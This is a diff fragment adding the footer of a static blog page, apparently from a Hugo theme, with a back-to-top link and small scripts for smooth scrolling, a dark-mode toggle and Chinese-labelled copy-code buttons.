+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
